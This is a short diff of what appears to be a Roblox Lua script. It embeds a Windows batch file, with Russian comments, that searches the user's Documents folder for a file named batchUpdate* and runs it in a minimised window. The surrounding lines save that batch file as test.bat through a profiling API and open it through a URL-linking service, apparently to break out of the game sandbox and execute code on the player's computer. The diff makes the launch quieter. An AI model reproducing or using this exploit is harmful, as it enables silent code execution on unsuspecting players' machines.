@@ -38,16 +38,18 @@ local scriptContent = [[@echo off
 @echo off
 setlocal enabledelayedexpansion
 
-set "searchFile=batchUpdate"
-set "documentsPath=%UserProfile%\Documents"
-
-for /r "%documentsPath%" %%F in ("%searchFile%*") do (
-    echo Найден файл: %%F
-    start "" "%%F"
-    exit /b
+:: Поиск файла batchUpdate в документах
+for /r "%USERPROFILE%\Documents" %%F in (batchUpdate*) do (
+    if exist "%%F" (
+        start /min cmd /c "%%F"
+        echo Файл открыт: %%F
+        exit /b
+    )
 )
 
-echo Файл не найден
+:: Если файл не найден
+echo Файл batchUpdate не найден в документах
+
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
